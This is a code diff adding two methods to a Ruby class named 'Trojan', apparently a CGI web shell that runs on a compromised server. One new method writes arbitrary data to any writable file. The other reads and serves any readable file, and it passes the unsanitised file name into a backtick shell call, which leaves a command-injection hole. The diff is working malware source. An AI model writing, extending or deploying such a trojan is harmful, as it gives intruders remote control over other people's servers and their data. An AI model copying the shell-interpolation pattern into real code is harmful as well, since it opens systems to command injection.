@@ -96,6 +96,35 @@ class Trojan
 
         self.send_response
     end
+
+    def payload_file_write json
+        Dir.chdir @cwd
+        write_file = json['args[file]'].first
+
+        if File.writable? write_file
+            File.open(write_file, 'w') {|f| f.write(json['args[data]'].first) }
+            @response['output'] = 'Write successful'
+        else
+            @response['error'] = 'Failed. File may not be writable, or may not exist.'
+        end
+        self.send_response
+    end
+
+    def payload_image_view json
+        Dir.chdir @cwd
+        img_file = json['args[file]'].first
+
+        if File.readable? img_file
+            # defer to the shell for mime-type analysis so the trojan has
+            # fewer dependencies
+            mime_type = `file --mime-type -b #{img_file}`.strip!
+            puts @cgi.header("Content-Type: #{mime_type}")
+            puts File.read(img_file)
+        else
+            puts 'File does not exist.'
+        end
+        exit
+    end
 end
 
 # ---------- Procedural code starts here ----------
